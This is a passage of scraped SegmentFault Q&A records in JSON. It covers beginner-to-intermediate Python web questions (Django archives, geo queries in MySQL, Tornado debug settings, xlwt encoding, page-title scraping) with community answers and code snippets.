      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005728051\">\n<html><body>\n<p>最近在用 Django 做一个个人 Blog，想实现一个文章归档功能，效果像这样：</p>\n<p><img data-src=\"/image?src=http://7xq740.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160615183933.png&amp;objectId=1010000005728051&amp;token=db9de850c3425ba98f00e1ae25a37c44\"/></p>\n<p>就是首页递减显示文章发表年份，点击该年份展开显示该年下的月份。</p>\n<p>我目前的实现思路是这样的：</p>\n<p>首先获取全部文章的发表时间（精确到月，已去重）：</p>\n<p><code>date_list = Article.objects.datetimes('created_time', 'month')</code></p>\n<p>然后把时间列表放到一个字典里，键是年份，值为月份列表：</p>\n<pre><code>date_dict = defaultdict(list)\n        for d in date_list:\n            print(type(d.year))\n            print(type(d.month))\n            date_dict[d.year].append(d.month)\n        return dict(date_dict)  # 模板不支持defaultdict</code></pre>\n<p>在模板中循环出来：</p>\n<pre><code>{% for year,month_list in d.items %}\n    &lt;p&gt;{{year}}&lt;p&gt;\n    {% for month in month_list  %}\n        &lt;p&gt;{{month}}&lt;p&gt;</code></pre>\n<p>能够实现部分需求，但是总觉得不优雅，其次是由于字典是无序的，可能导致显示的并非按照时间递减排序，如果要保持有序可能还得将字典改成二重列表，感觉更不优雅了。</p>\n<p>有什么更加优雅一些的实现方法么？或者一些比较好的实践方法介绍。</p>\n</body></html>\n</div>",
      "favourite": "3",
      "glance": "202",
      "tags": [
        "django",
        "python",
        "django-1.8",
        "python3.x"
      ],
      "time": "6-15",
      "title": "Django blog 实现文章自动归档有什么优雅的方法么？",
      "url": "https://segmentfault.com/q/1010000005728051"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000097124\">\n<p>唔.这个问题深层的我不太清楚诶.不过话说应该可以跟豆瓣那里要到API访问频率更大的KEY吧~一般的API不都是这样的么~呵呵</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003886588\">\n<p>楼主有没有相关把需要的数据自己去爬回来？</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000097127\">\n<p>一般做访问请求数限制是不会实时计算的，那样消耗太大，得不偿失。所以你在问题中提到的第60秒的问题不存在，如果是我不会这么来精确计算。</p><p>下面只是来介绍下怎么做请求数限制，比较土一点的办法是这样，应用服务和访问控制是两个完全独立的服务，应用服务只会在第三方服务请求时记录下日志，这时另外一个访问控制服务会实时监听这个日志，并记录下每个ip的访问情况。它会每段时间算个平均值，所以你算的跟它算的是不一样的。如果你超过某个限制，它就会ban掉你。</p><p>另外虽然豆瓣对每个api的请求数有明文规定，但是针对单个ip的请求数大多数提供api的服务商都是有限制的，这是基于服务器本身安全的需要。</p><p>建议你如果无法得到豆瓣的商务支持，那么只能自己做一做缓存了。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094965\">\n<p>大家好，目前我在弄个豆瓣的网页应用。遇到些问题<br/>\nQ1:<br/>\n40次/分钟 是针对一组特定的（IP, APIKEY）还是只针对IP<br/>\n比如在<br/>\nIP_A上(APIKEY1, IP_A)上被返回403了之后<br/>\nIP_B上(APIKEY1, IP_B)上是否 继续使用<br/>\n因为如果是弄网页应用的话，服务器固定IP 明显40次/分钟的限制是不够的，40访问者就够呛了<br/>\nQ2：<br/>\n每分钟40/次的API访问限制具体是如何进行判断的？<br/>\n因为我有自己的调度算法，通过日志上观察 每分钟的访问次数还是不超过四十次的.<br/>\n我的理解是这样<br/>\n在时间<br/>\n0(s) 进行第1次访问<br/>\n....<br/>\n....<br/>\n60(s)之内进行了n次访问(n &lt;= 40)<br/>\n那么在第61~120秒的时间内, 应该又能最多够进行40次访问。(我的理解)</p><p>是这样么？<br/>\n因为我的日志显示，在当前的调度算法内是不会超额访问API的，但实际上却返回了403.</p><p>希望得到高手的解答，谢谢！</p>\n</div>",
      "favourite": "1",
      "glance": "5.8k",
      "tags": [
        "python",
        "app",
        "豆瓣"
      ],
      "time": "2011-09-26",
      "title": "关于豆瓣API 40次/分钟的访问限制",
      "url": "https://segmentfault.com/q/1010000000094965"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000097669\">\n<p>mongoDB实现空间数据库该有的东西.. 原生就支持地理范围检索...无需各种用不着的东西...4sq就是用它的</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000097670\">\n<p>mongodb geo</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000097671\">\n<html><body>\n<p>不需要用到redis作经纬度查询，当然你做缓存除外。实际上我们在<a href=\"http://segmentfault.com/hackathon-bj-2011\" rel=\"nofollow\" target=\"_blank\" title=\"黑客马拉松\">黑客马拉松</a>就做过一个<a href=\"http://segmentfault.com/42talk\" rel=\"nofollow\" target=\"_blank\" title=\"类似的项目\">类似的项目</a>，它的核心思想就是取出当前用户所在地点附近的用户。</p>\n<p>我们使用的是MongoDB的Geo索引，这里有详细的介绍<a href=\"http://www.mongodb.org/display/DOCS/Geospatial+Indexing\" rel=\"nofollow\" target=\"_blank\" title=\"http://www.mongodb.org/display/DOCS/G...\">http://www.mongodb.org/display/DOCS/G...</a>。</p>\n<p>但是我注意到你使用的是mysql，虽然MongoDB能够很方便的实现这一目标，但如果你不想迁移数据库的话，也还是有方法来实现的，当然你得有思想准备，此方法可能比较曲折。我以下要说的大部分内容都来自Mysql AB介绍实现geo search的文章。</p>\n<p>首先我们要解决的是把经纬度之差换算成距离之差，这里面涉及到一些角度转换公式，它就是</p>\n<p><img data-src=\"http://segmentfault.com/img/dTuGOG\"/></p>\n<p>其中<code>d</code>是距离(distance)，<code>R</code>是地球半径。这个公式很复杂，但是我们的最终目标是把<code>d</code>求出来，我们来看这个求值过程，以下是伪代码</p>\n<pre>R = 地球半径\nΔlat = lat2 − lat1    //纬度之差\nΔlong = long2 − long1 //经度之差\na = sin2(Δlat/2) + cos(lat1) * cos(lat2) * sin2(Δlong/2)\nc = 2*atan2(√a, √(1−a))\nd = R*c</pre>\n<p>来把它转换为SQL代码，看着会有点晕，其中3956是地球半径</p>\n<pre>￼3956 * 2 * ASIN ( SQRT (\n￼￼POWER(SIN((orig.lat - dest.lat)*pi()/180 / 2), 2) + COS(orig.lat * pi()/180) * COS(dest.lat * pi()/180) * POWER(SIN((orig.lon - dest.lon) * pi()/180 / 2), 2) ) ) as distance</pre>\n<p>OK，求值代码已经出来了，来写个SQL测试下(hotels表有三个字段<code>hotel_name</code>,<code>lat</code>,<code>lon</code>)</p>\n<pre># 设置当前位置的经纬度\nset @orig_lat=122.4058;\nset @orig_lon=37.7907;\n\n# 设置最大搜索距离\nset @dist=10;\n\nSELECT *, 3956 * 2 * ASIN(SQRT(\nPOWER(SIN((@orig_lat - abs(dest.lat)) * pi()/180 / 2), 2) + COS(@orig_lat * pi()/180 ) * COS(abs(dest.lat) * pi()/180) * POWER(SIN((@orig_lon – dest.lon) *\npi()/180 / 2), 2) )) as distance FROM hotels dest\nhaving distance &lt; @dist ORDER BY distance limit 10;</pre>\n<p>这样你就可以把距离当前位置<code>10</code>以内的的hotels全部搜索出来了。你可以用存储过程来优化这一代码，让它更加快速。</p>\n</body></html>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095244\">\n<p>Hi，现在做的东西需要实时存储用户的经纬度，然后要求能快速得到某个指定经纬度附近的用户的列表。<br/>\n我的问题是：</p><ol><li>以什么形式存储经纬度比较好？</li><li>怎么找出数据库里距离某经纬度比较近的其它用户？</li><li>需要用redis之类的nosql db么？</li></ol><p>PS： 我现在的后台用django写的，数据库用的mysql。</p>\n</div>",
      "favourite": "11",
      "glance": "7.3k",
      "tags": [
        "django",
        "nosql",
        "redis",
        "python",
        "mysql"
      ],
      "time": "2011-12-08",
      "title": "如何为实时性应用存取经纬度？",
      "url": "https://segmentfault.com/q/1010000000095244"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000098151\">\n<p>如果是很窄的，想要为了什么做个小工具的话很简单，用几个库搭配一下就行了，只要会用别人的库加上一些基本语句没问题</p><p>如果是通用的大软件自然不容易了</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000098232\">\n<p>不需要python，看看wget的参数吧，直接镜像站点。<br/>\n复杂的话涉及格式化、多线程、多进程、数据库、html、js等等</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000098110\">\n<p>看你什么需求，比如我要扒豆瓣上美女相册，python用BeautifulSoup把图片地址过滤出来，然后os.system(\"wget\")就搞定了。<br/>\n你如果希望支持多种协议，或者长时间跑在服务器上，伪装客户端，robot自动爬资料，连接池⋯⋯那自然要看的知识就多了</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095481\">\n<p>自己对下载东西挺感兴的，想找些代码来看看，大家有什么好的推荐没有？</p><p>做下载器，需要python哪些方面的知识呢？</p>\n</div>",
      "favourite": "3",
      "glance": "3.4k",
      "tags": [
        "python"
      ],
      "time": "2012-02-22",
      "title": "用Python做下载器，需要哪些方面的知识？",
      "url": "https://segmentfault.com/q/1010000000095481"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095546\">\n<html><body>\n<p>系统是 Mac, 用的是 Office 2011，python 安装了 <a href=\"http://pypi.python.org/pypi/xlwt\" rel=\"nofollow\" target=\"_blank\" title=\"xlwt\">xlwt</a></p>\n<p>代码如下：</p>\n<pre>#!/usr/bin/env python \n# -*- coding: utf-8 -*- \nimport xlwt \n\nfile = xlwt.Workbook(encoding = 'utf-8') \ntable = file.add_sheet('hello', cell_overwrite_ok = True) \n\ntable.write(1, 1, '测试') \nfile.save('demo.xls')</pre>\n<p>数据写入到 demo.xls 文件中，打开该文件后，单元格的内容都是乱码，但鼠标点击该单元格，在上方的公式栏(fx)里显示又是正常的（如下图），若将本文件在 windows 里打开，中文又能正常显示，请问这是什么原因呢？该如何解决？</p>\n<p><img data-src=\"http://segmentfault.com/img/ekvjfS\"/></p>\n<h4>解决方法</h4>\n<p>根据 @fen 的思路，加了下面的代码解决了：</p>\n<pre>style = xlwt.XFStyle()\nfont = xlwt.Font()\nfont.name = 'SimSun'    # 指定“宋体”\nstyle.font = font       \n\ntable.write(1, 1, '测试', style) # 使用 style</pre>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "9.6k",
      "tags": [
        "python",
        "excel",
        "xlwt",
        "乱码"
      ],
      "time": "2012-03-13",
      "title": "使用 xlwt 生成的 excel 文件单元格的中文是乱码",
      "url": "https://segmentfault.com/q/1010000000095546"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095948\">\n<p>代码如下</p><pre>def createMenu(self, menuData):\n        menu = wx.Menu()\n        ...\n        return menu</pre><p>中间代码省略，可以知道<code>menu</code>是指向<code>wx.Menu()</code>的，但是在其返回时wx.Menu()已经被回收。但是后续的代码时候<code>createMenu</code>的返回值，这时候<code>menu</code>指向的对象已经不存在了，这怎么还正常？譬如c++的指针，引用返回是不能返回临时变量的。莫非<code>wx.Menu()</code>是个静态变量，我没查到资料。请说明一下，谢谢</p>\n</div>",
      "favourite": "0",
      "glance": "2.9k",
      "tags": [
        "python",
        "wxpython"
      ],
      "time": "2012-08-01",
      "title": "关于python的返回值问题",
      "url": "https://segmentfault.com/q/1010000000095948"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000098673\">\n<pre>print ' ',\nfor i in range(6):\n    for j in range(i):\n        print '\\b*',\n    print</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000098680\">\n<pre>from __future__ import print_function\nfor i in range(6):\n    for j in range(i):\n        print('*', end='')\n    print()</pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000098658\">\n<pre>for i in range(6):\n      print '*'*i</pre>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095970\">\n<p>最近利用python的时候发现一个下细节 然后一直不知道怎么解决 例如下面一段代码</p><pre>for i in range(6):\n    for j in range(i):\n        print '*',\n    print</pre><p>会输出这样一段<br/><blockquote>*<br/>* *<br/>* * *<br/>* * * *<br/>* * * * *</blockquote><p>正如你看到的每个*后面有个空格，我想应该是print语句自己输出的，那么怎么将这个空格去掉呢输出成这样：</p><blockquote>*<br/>**<br/>***<br/>****<br/>*****</blockquote>\n</p></div>",
      "favourite": "3",
      "glance": "10.6k",
      "tags": [
        "python",
        "空格"
      ],
      "time": "2012-08-11",
      "title": "python print语句后怎么去掉自动输出的空格",
      "url": "https://segmentfault.com/q/1010000000095970"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000116488\">\n<p>我的方法和 @null 类似<br/>\n用 tornado 自带的 <code>tornado.options.parse_config_file(/path/to/server.conf)</code><br/>\n来解析配置文件 server.conf<br/>\nserver.conf 是一个软链接到对应环境的配置文件 server.{develop, production}.conf</p><p>启动参数一多的话，写到 supervisor.config 里修改和部署起来略嫌繁琐 :)</p><p>reference: <a href=\"http://www.tornadoweb.org/documentation/options.html\" rel=\"nofollow\" target=\"_blank\" title=\"http://www.tornadoweb.org/documentati...\">http://www.tornadoweb.org/documentati...</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000116386\">\n<p>最简单的：通过hostname判断</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000116423\">\n<p>1, 开发环境弄个.debug文件</p><pre>DIR = os.path.dirname(os.path.abspath(__file__))\nDEBUG = os.path.isfile(os.path.join(DIR,'.debug'))</pre><p>同时把这个.debug添加到.gitignore/.hgignore/.svnignore里面</p><p>生产环境checkout的时候就没有了，也就是DEBUG = False了</p><p>2, 另外 tornado本身的options也能用来干这个， 比如在runserver.py里写上</p><pre>from tornado.options import define, options\ndefine(\"debug\",default=True,help=\"Debug Mode\",type=bool)\noptions.parse_command_line()</pre><p>那么平时启动的时候./runserver.py 就是options.debug为True</p><p>而在生产环境下只需要启动文件里(比如init文件或者supervisor配置文件)commnand=<code>$PROJECT/runserver.py --debug=false</code>, 那么options.debug就为False</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000116332\">\n<p>在用<a href=\"http://www.tornadoweb.org\" rel=\"nofollow\" target=\"_blank\" title=\"Tornado\">Tornado</a>写点东西玩玩。<br/>\n我需要在本机开发的时候打开debug模式，在vps上部署的时候关闭debug模式。当然可以用手工在每次部署的时候把DEBUG置为False。但是这样不太好吧。<br/>\n可以在代码中判断吗？</p><p>用php开发的时候是我们的做法是判断apache中的ServerAdmin。</p>\n</div>",
      "favourite": "5",
      "glance": "4k",
      "tags": [
        "python",
        "tornado"
      ],
      "time": "2012-09-05",
      "title": "python web应用如何判断部署环境",
      "url": "https://segmentfault.com/q/1010000000116332"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000098235\">\n<p>推荐语言：Python<br/>\n学习步骤：<br/>\n1. HTML/CSS 推荐一本比较老的书：<a href=\"http://book.douban.com/subject/1799652/\" rel=\"nofollow\" target=\"_blank\" title=\"深入显出HTML与CSS、XHTML\">深入显出HTML与CSS、XHTML</a><br/>\n2. JavaScript 推荐<a href=\"http://book.douban.com/subject/1869705/\" rel=\"nofollow\" target=\"_blank\" title=\"JavaScript高级程序设计\">JavaScript高级程序设计</a><br/>\n3. Python 推荐<a href=\"http://book.douban.com/subject/3948354/\" rel=\"nofollow\" target=\"_blank\" title=\"Python学习手册\">Python学习手册</a>，当然官方文档是必读的<br/>\n4. Python的某个Web框架，比如<a href=\"http://flask.pocoo.org/\" rel=\"nofollow\" target=\"_blank\" title=\"Flask\">Flask</a>之类</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000098239\">\n<p>初学开发并且是想做Web开发的话，我推荐你还是从PHP学起比较好。Ruby或者Python对你来说可能比较难。当然这个看个人悟性，只是建议。</p><p>因为PHP语法简单，页面结构也比较容易理解，代码和现成的应用比较多，方便你看着代码自学。社区也比较成熟。你想知道的很多问题，应该都已经有答案了。</p><p>另外，推荐你看下这两篇文章。<br/>\n1. Web开发：我希望得到的编程学习路线图<br/>\n<a href=\"http://blog.jobbole.com/15213/\" rel=\"nofollow\" target=\"_blank\" title=\"http://blog.jobbole.com/15213/\">http://blog.jobbole.com/15213/</a><br/>\n文章的作者是个学法律的，他叙述了他如何自学Web开发的。以及一些有用的学习线路图给你参考。</p><p>2. 循序渐进学编程<br/>\n<a href=\"http://blog.jobbole.com/15032/\" rel=\"nofollow\" target=\"_blank\" title=\"http://blog.jobbole.com/15032/\">http://blog.jobbole.com/15032/</a><br/>\n这篇文章是告诉你如何循序渐进的学习编程。希望能对初学的你有所帮助。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000492994\">\n<p>嗯，又一个自称菜鸟的，我最喜欢菜鸟了  ^_^</p>\n<ol>\n<li>可以</li>\n<li>编程语言之间不是冰与火，如汉语和英语一样，是可以并存的</li>\n</ol>\n<p>正好俩都用过</p>\n<p>一直想用 Ruby，但最后阴差阳错的用 Golang 搭了个网站<br>\n平时脚本还是喜欢用 Ruby</br></p>\n<p>为什么呢？<br>\n因为用 Ruby的话，码代码和伪代码居然一样！（1. 我现在用过的语言里 2. 忽略 <code>end</code> 后）</br></p>\n<p>还有，Ruby 之父是个很有意思的人，看过他的<br><a href=\"http://book.douban.com/subject/24536403/\" rel=\"nofollow\">代码的未来 : 代码的未来</a><br><a href=\"http://book.douban.com/subject/6756090/\" rel=\"nofollow\">松本行弘的程序世界</a><br>\n很难不被吸引过去</br></br></br></p>\n<p>小白不推荐 ROR，现在太臃肿了，官方的文档上来还测试先行，不知道极限编程的，很容易莫名其妙呢<br>\nGolang 的话， Martini 框架很不错<br>\nRuby 可以试试 Sinatra，先做个小东西出来，尝到甜头，慢慢由浅入深</br></br></p>\n<p>另外同时搞 HTML + CSS + JS + Golang/Ruby，要做好精力与时间管理<br>\n冰冻三尺非一日之寒，学习是个由易到难的过程，慢慢迭代</br></p>\n<hr>\n<p>呃，被采纳了，那再多补充一点：<br>\n自己一个人看书做实验码代码其实是一种比较慢的学习方式<br>\n有人带或者在小组讨论中学习，是可以有效加速的<br>\n这也是结对编程的魅力（之一）所在吧</br></br></br></p>\n<p>具体原因看<a href=\"http://www.zhihu.com/question/20982901\" rel=\"nofollow\">知乎的这个讨论</a></p>\n<p>但鉴于客观事实是很难有个很好的环境，所以也不能以此为借口停止自己的过程<br>\n确保当 keyman 或 机会到来的时候，你已做好了万全的准备</br></p>\n</hr></div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095618\">\n<p>本人英语专业，对编程菜鸟想学ruby 有用吗？据说谷歌也有个Go 该学哪个？ 如果做一个segmentfault网站，用ruby和HTML 以及Css和JS可以了吗</p>\n</div>",
      "favourite": "6",
      "glance": "5.3k",
      "tags": [
        "ruby",
        "python",
        "编程"
      ],
      "time": "2012-03-31",
      "title": "编程菜鸟如何规划自己的编程学习之路？",
      "url": "https://segmentfault.com/q/1010000000095618"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000118640\">\n<p>Python只能用一核，如果是这个原因，起多个，用nginx lb试试呢</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000204698\">\n<p>用tornado吧。。。\n性能很好。。\n和web.py又很像。。。\n<a href=\"http://sebug.net/paper/books/tornado/\" rel=\"nofollow\">http://sebug.net/paper/books/tornado/</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000118618\">\n<p>@iammutex 大，可以换gevent跑fcgi，但用web.py库试试……</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000118572\">\n<p>最近要做些python的东西，初选了web.py这个精简框架。但是做了一些性能测试不太深意。<br/>\n最简单的hello world程序，试过flup + spawn-fcgi + nginx，也试过uwsgi + nginx，但性能上实在觉得不太行。用ab压，3k-5k的qps，同样的机器，php 跑 nginx + fastcgi模式简简单单就跑到10k+了。<br/>\nPS：机器是低配服务器，8G内存，16核<br/>\n现在疑惑的是不知道有什么优化方面的事情可以做。包括框架层或者是python语言层面的。比如像php的eaccelerator这类东西。<br/>\n求教。</p>\n</div>",
      "favourite": "1",
      "glance": "4.4k",
      "tags": [
        "python",
        "web.py"
      ],
      "time": "2012-09-16",
      "title": "大家用web.py的性能如何，求教性能优化方法。",
      "url": "https://segmentfault.com/q/1010000000118572"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000120336\">\n<p>发现了这个问题，百思不得其解；</p><pre>bb=100\ndef func():\n     print bb  #right\n------------------------------\ndef func():\n     bb=bb+1  #error</pre><p>如上所示，调用函数<code>func</code>使用<code>bb=bb+1</code>会出错，<code>unBoundError</code>错误，为啥只打印bb时没错，执行了个自加一操作会出现?</p>\n</div>",
      "favourite": "2",
      "glance": "2.8k",
      "tags": [
        "python"
      ],
      "time": "2012-09-22",
      "title": "python函数作用域问题",
      "url": "https://segmentfault.com/q/1010000000120336"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000371470\">\n<p>不想说太多，在字符编码这个问题上面，Python3一开始就支持Unicode，这可以让避免很多编码问题。</p>\n<p>用过Python2的人都知道Python2中同时存在str和unicode两种字符串类型，由此带来一些编码方面的问题让人苦不堪言，没有被这个坑过人的人是幸福的。</p>\n<p>字符串一开始就是Unicode，我认为是Python3最值得注意的改进之处。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000096380\">\n<p>三言两语说不清，请看这里 -&gt;<br/>\n<a href=\"http://docs.python.org/py3k/whatsnew/3.0.html\" rel=\"nofollow\" target=\"_blank\" title=\"http://docs.python.org/py3k/whatsnew/...\">http://docs.python.org/py3k/whatsnew/...</a></p><p>另外还有python2与python3的对比文章一篇，同样推荐。 -&gt; <a href=\"http://wiki.python.org/moin/Python2orPython3\" rel=\"nofollow\" target=\"_blank\" title=\"http://wiki.python.org/moin/Python2or...\">http://wiki.python.org/moin/Python2or...</a></p><p>如果初学的话个人建议学习python 2.x，很多教程还有lib都是python 2.x的。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000122642\">\n<p>学习<code>Python</code>语法，<code>Python2</code>和<code>Python3</code>区别并不大。在Python27里也可以通过<code>from __futer__ import blabla</code></p><p>所以用哪个学习，无所谓。</p><p>在实际使用中更常用的是<code>Python2</code>，因为很多相关的库仍然未支持<code>Python3</code>。但是建议打开<code>python</code>的<code>-3</code>选项，这样对你自己代码中不兼容部分可以提前知晓然后提前做兼容性修改。</p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094626\">\n<p>python3相对python2有哪些改进的地方？</p>\n</div>",
      "favourite": "1",
      "glance": "8.9k",
      "tags": [
        "编程",
        "python"
      ],
      "time": "2011-06-17",
      "title": "python3相对python2有哪些改进的地方？",
      "url": "https://segmentfault.com/q/1010000000094626"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000124137\">\n<p>通用的方法是使用htmlparser解析.</p><p>比如使用lxml扩展包来解析:</p><pre>from lxml import html\ndoc = html.parse('http://www.apple.com/')\ntitle = doc.find('.//title').text\nprint title</pre><p>或者使用BeautifulSoup来解析:</p><pre>import urllib\nfrom BeautifulSoup import BeautifulSoup\ncontent = urllib.urlopen('http://www.apple.com/').read()\nsoup = BeautifulSoup(content)\nprint soup.find('title')</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000124043\">\n<pre>re.findall(r\"&lt;title&gt;(.*)&lt;/title&gt;\",\"&lt;title&gt;Apple&lt;/title&gt;\")</pre><p>正则有一个分组功能。。。。。。。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000124094\">\n<p>有一个简单的错误。HTML文件不能用正则表达式parse，因为他的文法比正则表达式高级，具体原因参考<a href=\"http://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags\" rel=\"nofollow\" target=\"_blank\" title=\"这里\">这里</a>。<br/>\n推荐解析这种HTML用一些第三方库，例如mechanize<br/>\n我的代码如下：</p><pre>import mechanize\nimport cookielib\nif __name__=='__main__':\n    br = mechanize.Browser()\n    br.set_cookiejar(cookielib.LWPCookieJar()) # Cookie jar\n    \n    br.set_handle_equiv(True) # Browser Option\n    br.set_handle_gzip(True)\n    br.set_handle_redirect(True)\n    br.set_handle_referer(True)\n    br.set_handle_robots(False)\n    \n    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)\n    \n    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] \n    br.open(\"http://apple.com\")\n    print br.title()</pre><p>输出为Apple<br/>\n对于mechanize的详细使用，参考<a href=\"http://reyoung.me/index.php/2012/08/08/%E7%BF%BB%E8%AF%91%E4%BD%BF%E7%94%A8python%E6%A8%A1%E4%BB%BF%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%8C%E4%B8%BA/\" rel=\"nofollow\" target=\"_blank\" title=\"这里\">这里</a></p><p>安装mechanize，就easy_install一下就好。</p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000124036\">\n<p>通过 urllib 将网页内容抓取下来，然后用正则表达式 re 模块将标题匹配出来，但是发现部分标题会出现问题，比如下面抓 Apple 的代码运行结果是 <code>App</code>，测试发现匹配结果 m 是没有问题的，问题出现在了 strip() 这里。</p><pre># -*- coding: utf-8 -*-\nimport urllib\nimport re\n\nurl='http://apple.com'\nhtml = urllib.urlopen(url).read()\n#print html\nm = re.search(\"&lt;title&gt;.*&lt;/title&gt;\", html)\nprint m.group() # 这里输出结果 &lt;title&gt;Apple&lt;/title&gt;\nprint m.group().strip(\"&lt;/title&gt;\") #问题应该出现在这个正则</pre>\n</div>",
      "favourite": "6",
      "glance": "17.9k",
      "tags": [
        "python"
      ],
      "time": "2012-10-02",
      "title": "python如何正确抓取网页标题",
      "url": "https://segmentfault.com/q/1010000000124036"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000127775\">\n<p>来做一个不一定靠谱的回答<br/>\n你可以写一个<code>shell</code>脚本来包装它们，如</p><pre>#!/bin/bash\nsource /path/to/your_venv/bin/activate\npython /path/to/your/python_script.py</pre><p>然后把它作为cmd来执行</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000127771\">\n<p>来做一个不一定靠谱的回答<br/>\n你可以写一个<code>shell</code>脚本来包装它们，如</p><pre>#!/bin/bash\nsource /path/to/your_venv/bin/activate\npython /path/to/your/python_script.py</pre><p>然后把它作为<code>cmd</code>来执行</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000127867\">\n<p>你忘了指定python环境了和selecter了</p><pre>\"build_systems\":\n[\n    {\n        \"name\": \"Run Tests\",\n        \"env\": {\n            \"PYTHONPATH\": \"/Users/Toon/Code/venv/bin/python:/Users/Toon/Code/venv/lib/python2.7/site-packages\"\n            },\n        \"cmd\": [\"python\", \"$file\"],\n        \"selector\": \"source.python\"\n    }\n]</pre><p>这样就可以了，运行应该没问题了</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000127605\">\n<p>目录结构是这样的</p><pre>/venv  # 这是virtualenv创建的虚拟目录\n|--/bin\n|--/include\n`--/lib\n\n/myapp # 这是我的flask应用地址\n|--wsgi.py</pre><p>在bash下运行 <code>venv/bin/activate</code> 后切换到虚拟环境，然后运行 wsgi.py 没有问题。<br/>\n但是，在sublime text下点击【Tools】-&gt;【Build】提示出错，说找不到flask模块，flask模块是我在virtualenv下用pip安装的：</p><pre>Traceback (most recent call last):\n  File \"/Users/Toon/Code/myapp/wsgi.py\", line 4, in &lt;module&gt;\n    from flask import Flask, request, session, redirect, url_for, abort, \\\nImportError: No module named flask\n[Finished in 0.1s with exit code 1]</pre><p>于是我想，这里Build应该没有导入virtualenv下的site-packages，在网上搜了到了这个答案<br/>\n<a href=\"http://stackoverflow.com/questions/11965707/using-virtualenv-with-sublime-text-2\" rel=\"nofollow\" target=\"_blank\" title=\"http://stackoverflow.com/questions/11...\">http://stackoverflow.com/questions/11...</a><br/>\n按照他的方法，我对工程文件myapp.sublime-project进行了下列设置</p><pre>{\n    \"folders\":\n    [\n\t{\n\t    \"path\": \"/Users/Toon/Code/myapp\"\n\t}\n    ],\n    \"build_systems\":\n    [\n        {\n        \"name\": \"Run Tests\",\n        \"cmd\": [\"source\", \"/Users/Toon/Code/venv/bin/activate\"],\n        \"working_dir\": \"/Users/Toon/Code/myapp\",\n        \"cmd\": [\"python\", \"wsgi.py\"]\n        }\n    ]\n}</pre><p>保存后build，仍然出现上面的错误提示，是不是site-packages荏苒没有被导入呢，问题出在哪了呢？</p>\n</div>",
      "favourite": "2",
      "glance": "5.6k",
      "tags": [
        "python",
        "sublime-text",
        "virtualenv"
      ],
      "time": "2012-10-13",
      "title": "sublime text 2中怎样使用virtualenv环境进行build？",
      "url": "https://segmentfault.com/q/1010000000127605"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
